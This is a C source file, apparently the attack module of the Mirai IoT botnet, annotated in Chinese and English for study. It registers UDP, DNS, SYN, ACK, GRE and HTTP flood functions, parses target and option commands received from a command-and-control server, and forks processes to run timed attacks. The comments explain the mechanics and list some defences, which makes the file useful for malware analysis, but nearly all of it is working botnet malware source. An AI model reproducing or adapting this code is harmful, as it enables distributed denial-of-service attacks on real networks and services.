#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

BOOL attack_init(void)  //注册一系列具体的Dos攻击函数【attack_app.c、attack_gre.c、attack_tcp.c和attack_udp.c中实现了具体的DoS攻击函数】
{   //在methods中增加不同攻击类型的DDos函数
    int i;
    /*1)Straight up UDP flood  2)Valve Source Engine query flood
    * 3)DNS water torture  4)Plain UDP flood optimized for speed
    */
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    /*1)SYN flood with options  2)ACK flood
    * 3)ACK flood to bypass mitigation devices
    */
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    // 1)GRE IP flood  2)GRE Ethernet flood
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);

    // HTTP layer 7 flood
    //Mitigating application layer attacks is particularly complex
    //, as the malicious traffic is difficult to distinguish from normal traffic.
    //HTTP GET ATTACK【请求images、files等大文件】
    //HTTP POST ATTACK
    //—— The process of handling the form data and running the necessary database commands 
    //is relatively intensive compared to the amount of processing power and bandwidth required to send the POST request. 
    //This attack utilizes the disparity in relative resource consumption,
    // by sending many post requests directly to a targeted server until it's capacity is saturated and denial-of-service occurs.
    //与发送 POST 请求所需的处理能力和带宽相比，处理表单数据和运行必要的数据库命令的过程相对密集。
    //这种攻击利用相对资源消耗的差异，直接向目标服务器发送多个发送请求，直到服务器的容量达到饱和并发生拒绝服务。
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http); 
    //防御：
    //校验码+挑战应答【JavaScript computational challenge】
    //WAF: 维护IP名誉数据库【IP reputation database】，选择性的阻断恶意流量
    //工程师在线流量分析【on-the-fly analysis】
    return TRUE;
}

void attack_kill_all(void)
{
    int i;

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }

#ifdef MIRAI_TELNET
    scanner_init();
#endif
}
//按照事先约定的格式解析下发的攻击命令，即取出攻击参数
//https://www.freebuf.com/articles/terminal/117927.html
//4字节攻击时长，1字节攻击类型、攻击目标（目标数+ip地址+mask+ip地址+mask……+flags）
//flags是可以配置数据包的特定字段（可选配置项如attack.h）中所示
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    // Read in attack duration uint32_t
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));   //定义了发动攻击的时长
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);

    // Read in attack ID uint8_t
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;  //确定8-bits的发动攻击类型
    len -= sizeof (uint8_t);

    // Read in target count uint8_t
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++; //给出目标受害者的ip个数
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;

    // Read in all targs
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len)) //循环获取每个ipv4地址，存储到attack_target结构体中，targs存储了所有带攻击集合
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;   //给出子网掩码，1byte
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;    //ipv4
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    // Read in flag count uint8_t
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;    //flag和参数选项的长度【就是自行构造ip-tcp报文头部需要的数据】
    len -= sizeof (uint8_t);

    // Read in all opts
    if (opts_len > 0)  //获取参数选项存储到attack_option中，opts存储了所有参数选项的集合
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)  //key-data键值对的方式存储选项【key的大小固定为8bits，data根据存储的val_len确定长度】
        {
            uint8_t val_len;

            // Read in key uint8
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            // Read in data length uint8
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));   
            util_memcpy(opts[i].val, buf, val_len);  //key对应的data
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);  //启动攻击

    // Cleanup
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

//调用相应的DoS攻击函数
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)  //父进程A return，子进程A'继续
        return;

    pid2 = fork();   //子进程A'继续fork，得到子进程A''
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)   //子进程A''sleep(duration),之后杀死父进程，即A'
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else                 //第二次fork的父进程，即A'进行攻击
    {
        int i;

        for (i = 0; i < methods_len; i++)   //methods_len为当前注册的攻击函数个数，在add_attack中++
        {
            if (methods[i]->vector == vector)   //找到当前C2要求的攻击函数
            {
#ifdef DEBUG
                printf("[attack] Starting attack...\n");
#endif          //C语言函数指针实现的C++多态
                methods[i]->func(targs_len, targs, opts_len, opts); //对目标targs发起指定攻击【使用opts参数】
                break;
            }
        }

        //just bail if the function returns
        exit(0);   //父进程退出【但可能会在退出前被子进程kill掉】
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)   //字典查询，根据key得到data
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method; //methods内存储了所有注册的Dos攻击方式
}

static void free_opts(struct attack_option *opts, int len)
{
    int i;

    if (opts == NULL)
        return;

    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
